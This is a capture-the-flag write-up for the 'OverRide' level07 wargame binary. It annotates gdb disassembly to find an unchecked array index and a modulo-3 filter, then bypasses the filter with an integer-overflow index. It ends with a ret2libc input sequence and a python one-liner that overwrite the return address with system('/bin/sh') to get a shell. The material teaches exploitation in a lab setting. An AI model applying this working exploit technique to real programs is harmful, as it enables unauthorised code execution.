# OVERRIDE

## level07

```sh
(gdb) info functions
All defined functions:

...
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
...
```
```sh
(gdb) disas get_unum
Dump of assembler code for function get_unum:
   0x080485e7 <+0>:     push   %ebp
   0x080485e8 <+1>:     mov    %esp,%ebp
   0x080485ea <+3>:     sub    $0x28,%esp
   0x080485ed <+6>:     movl   $0x0,-0xc(%ebp)            # n = 0
   0x080485f4 <+13>:    mov    0x804a060,%eax             # stdout
   0x080485f9 <+18>:    mov    %eax,(%esp)
   0x080485fc <+21>:    call   0x8048480 <fflush@plt>
   0x08048601 <+26>:    mov    $0x8048ad0,%eax            # "%u"
   0x08048606 <+31>:    lea    -0xc(%ebp),%edx
   0x08048609 <+34>:    mov    %edx,0x4(%esp)
   0x0804860d <+38>:    mov    %eax,(%esp)
   0x08048610 <+41>:    call   0x8048500 <__isoc99_scanf@plt>
   0x08048615 <+46>:    call   0x80485c4 <clear_stdin>
   0x0804861a <+51>:    mov    -0xc(%ebp),%eax            # return n
   0x0804861d <+54>:    leave
   0x0804861e <+55>:    ret
End of assembler dump.
```
```sh
(gdb) disas clear_stdin
Dump of assembler code for function clear_stdin:
   0x080485c4 <+0>:     push   %ebp
   0x080485c5 <+1>:     mov    %esp,%ebp
   0x080485c7 <+3>:     sub    $0x18,%esp
   0x080485ca <+6>:     movb   $0x0,-0x9(%ebp)
   0x080485ce <+10>:    jmp    0x80485d1
   0x080485d0 <+12>:    nop
   0x080485d1 <+13>:    call   0x8048490 <getchar@plt>
   0x080485d6 <+18>:    mov    %al,-0x9(%ebp)
   0x080485d9 <+21>:    cmpb   $0xa,-0x9(%ebp)            # '\n'
   0x080485dd <+25>:    je     0x80485e5
   0x080485df <+27>:    cmpb   $0xff,-0x9(%ebp)           # EOF
   0x080485e3 <+31>:    jne    0x80485d0
   0x080485e5 <+33>:    leave
   0x080485e6 <+34>:    ret
End of assembler dump.
```
```sh
(gdb) disas store_number
Dump of assembler code for function store_number:
   0x08048630 <+0>:     push   %ebp
   0x08048631 <+1>:     mov    %esp,%ebp
   0x08048633 <+3>:     sub    $0x28,%esp
                                                        #  0x8(%ebp)  unsigned int *tab
                                                        # -0x10(%ebp) unsigned int value
                                                        # -0xc(%ebp)  unsigned int index
   0x08048636 <+6>:     movl   $0x0,-0x10(%ebp)
   0x0804863d <+13>:    movl   $0x0,-0xc(%ebp)
   0x08048644 <+20>:    mov    $0x8048ad3,%eax
   0x08048649 <+25>:    mov    %eax,(%esp)
   0x0804864c <+28>:    call   0x8048470 <printf@plt>     # " Number: "
   0x08048651 <+33>:    call   0x80485e7 <get_unum>
   0x08048656 <+38>:    mov    %eax,-0x10(%ebp)           # value
   0x08048659 <+41>:    mov    $0x8048add,%eax
   0x0804865e <+46>:    mov    %eax,(%esp)
   0x08048661 <+49>:    call   0x8048470 <printf@plt>     # " Index: "
   0x08048666 <+54>:    call   0x80485e7 <get_unum>
   0x0804866b <+59>:    mov    %eax,-0xc(%ebp)            # index
   0x0804866e <+62>:    mov    -0xc(%ebp),%ecx
   0x08048671 <+65>:    mov    $0xaaaaaaab,%edx
   0x08048676 <+70>:    mov    %ecx,%eax
   0x08048678 <+72>:    mul    %edx
   0x0804867a <+74>:    shr    %edx
   0x0804867c <+76>:    mov    %edx,%eax
   0x0804867e <+78>:    add    %eax,%eax
   0x08048680 <+80>:    add    %edx,%eax                  # eax = (index/3)*3
   0x08048682 <+82>:    mov    %ecx,%edx
   0x08048684 <+84>:    sub    %eax,%edx                  # edx = index % 3
   0x08048686 <+86>:    test   %edx,%edx
   0x08048688 <+88>:    je     0x8048697                  # reject if index % 3 == 0
   0x0804868a <+90>:    mov    -0x10(%ebp),%eax
   0x0804868d <+93>:    shr    $0x18,%eax
   0x08048690 <+96>:    cmp    $0xb7,%eax
   0x08048695 <+101>:   jne    0x80486c2                  # reject if value>>24 == 0xb7
   0x08048697 <+103>:   movl   $0x8048ae6,(%esp)
   0x0804869e <+110>:   call   0x80484c0 <puts@plt>       # " *** ERROR! ***"
   0x080486a3 <+115>:   movl   $0x8048af8,(%esp)
   0x080486aa <+122>:   call   0x80484c0 <puts@plt>       # reserved for wil
   0x080486af <+127>:   movl   $0x8048ae6,(%esp)
   0x080486b6 <+134>:   call   0x80484c0 <puts@plt>
   0x080486bb <+139>:   mov    $0x1,%eax
   0x080486c0 <+144>:   jmp    0x80486d5
   0x080486c2 <+146>:   mov    -0xc(%ebp),%eax
   0x080486c5 <+149>:   shl    $0x2,%eax                  # index * 4   (wraps mod 2^32)
   0x080486c8 <+152>:   add    0x8(%ebp),%eax
   0x080486cb <+155>:   mov    -0x10(%ebp),%edx
   0x080486ce <+158>:   mov    %edx,(%eax)                # tab[index] = value
   0x080486d0 <+160>:   mov    $0x0,%eax
   0x080486d5 <+165>:   leave
   0x080486d6 <+166>:   ret
End of assembler dump.
```
```sh
(gdb) disas read_number
Dump of assembler code for function read_number:
   0x080486d7 <+0>:     push   %ebp
   0x080486d8 <+1>:     mov    %esp,%ebp
   0x080486da <+3>:     sub    $0x28,%esp
   0x080486dd <+6>:     movl   $0x0,-0xc(%ebp)
   0x080486e4 <+13>:    mov    $0x8048add,%eax
   0x080486e9 <+18>:    mov    %eax,(%esp)
   0x080486ec <+21>:    call   0x8048470 <printf@plt>     # " Index: "
   0x080486f1 <+26>:    call   0x80485e7 <get_unum>
   0x080486f6 <+31>:    mov    %eax,-0xc(%ebp)
   0x080486f9 <+34>:    mov    -0xc(%ebp),%eax
   0x080486fc <+37>:    shl    $0x2,%eax                  # no bounds check
   0x080486ff <+40>:    add    0x8(%ebp),%eax
   0x08048702 <+43>:    mov    (%eax),%edx                # tab[index]
   0x08048704 <+45>:    mov    $0x8048b1b,%eax
   0x08048709 <+50>:    mov    %edx,0x8(%esp)
   0x0804870d <+54>:    mov    -0xc(%ebp),%edx
   0x08048710 <+57>:    mov    %edx,0x4(%esp)
   0x08048714 <+61>:    mov    %eax,(%esp)
   0x08048717 <+64>:    call   0x8048470 <printf@plt>     # " Number at data[%u] is %u\n"
   0x0804871c <+69>:    mov    $0x0,%eax
   0x08048721 <+74>:    leave
   0x08048722 <+75>:    ret
End of assembler dump.
```
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:     push   %ebp
   0x08048724 <+1>:     mov    %esp,%ebp
   0x08048726 <+3>:     push   %edi
   0x08048727 <+4>:     push   %esi
   0x08048728 <+5>:     push   %ebx
   0x08048729 <+6>:     and    $0xfffffff0,%esp
   0x0804872c <+9>:     sub    $0x1d0,%esp
                                                        # 0x24(%esp)   unsigned int tab[100]
                                                        # 0x1b4(%esp)  int ret
                                                        # 0x1b8(%esp)  char cmd[20]
                                                        # 0x1cc(%esp)  canary
   0x08048732 <+15>:    mov    0xc(%ebp),%eax
   0x08048735 <+18>:    mov    %eax,0x1c(%esp)            # argv
   0x08048739 <+22>:    mov    0x10(%ebp),%eax
   0x0804873c <+25>:    mov    %eax,0x18(%esp)            # envp
   0x08048740 <+29>:    mov    %gs:0x14,%eax
   0x08048746 <+35>:    mov    %eax,0x1cc(%esp)
   0x0804874d <+42>:    xor    %eax,%eax
   0x0804874f <+44>:    movl   $0x0,0x1b4(%esp)           # ret / cmd zeroed
   ...
   0x08048791 <+110>:   lea    0x24(%esp),%ebx
   0x08048795 <+114>:   mov    $0x0,%eax
   0x0804879a <+119>:   mov    $0x64,%edx                 # 100
   0x0804879f <+124>:   mov    %ebx,%edi
   0x080487a1 <+126>:   mov    %edx,%ecx
   0x080487a3 <+128>:   rep stos %eax,%es:(%edi)          # tab[100] = {0}
   0x080487a5 <+130>:   jmp    0x80487ea
   0x080487a7 <+132>:    ... memset(*argv, 0, strlen(*argv)); argv++;
   0x080487ea <+199>:    ... while (*argv)
   0x080487f6 <+211>:    ... memset(*envp, 0, strlen(*envp)); envp++;
   0x08048839 <+278>:    ... while (*envp)
   0x08048843 <+288>:    puts(0x8048b38)                  # welcome banner
   0x0804884f <+300>:    printf("Input command: ")
   0x0804885c <+313>:    movl   $0x1,0x1b4(%esp)          # ret = 1
   0x08048882 <+351>:    fgets(cmd, 20, stdin)
   0x080488af <+396>:    cmd[strlen(cmd)-1] = 0            # strip \n
   0x080488ce <+427>:    repz cmpsb  ecx=5 vs "store"
   0x080488e1 <+446>:    jne    read_check
   0x080488ea <+455>:    call   store_number(tab)
   0x080488f6 <+467>:    jmp    print_status
   0x0804890f <+492>:    repz cmpsb  ecx=4 vs "read"
   0x08048922 <+511>:    jne    quit_check
   0x0804892b <+520>:    call   read_number(tab)
   0x08048937 <+532>:    jmp    print_status
   0x08048950 <+557>:    repz cmpsb  ecx=4 vs "quit"
   0x08048963 <+576>:    je     leave                      # quit
   0x08048965 <+578>:    # if ret != 0: " Failed to do %s command\n"
                        # else:        " Completed %s command successfully\n"
   0x080489a1 <+638>:    memset(cmd, 0, 20)
   0x080489ca <+679>:    jmp    input_loop
   0x080489d0 <+685>:    eax = 0
   0x080489d5 <+690>:    stack_chk / leave / ret           # RET = tab[114]
End of assembler dump.
```

```sh
(gdb) b *0x080487a3
Breakpoint 1 at 0x80487a3
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x080487a3 in main ()
(gdb) p (($ebp+4) - ($esp+36)) / 4
$1 = 114
```

```sh
p system
0xf7e6aed0 = 4159090384    system

p exit
0xf7e5eb70 = 4159023984    exit

info proc map - find X, X, "/bin/sh"
0xf7f897ec = 4160264172    "/bin/sh"
```

```sh
store
4159090384 #sys addr
1073741938 #index (EBP + 4)
# store[114] = 0xf7e6aed0
store
4159023984 #exit addr
115 #index (EBP + 8, EIP for system)
# tab[115] = 0xf7e5eb70
store
4160264172 # "/bin/sh" addr
116 #index (EBP + 12m 1st arg for system)
# tab[116] = 0xf7f897ec
quit
```

```sh
(python -c 'print "store\n4159090384\n1073741938\nstore\n4159023984\n115\nstore\n4160264172\n116\nquit"'; cat) | ./level07
```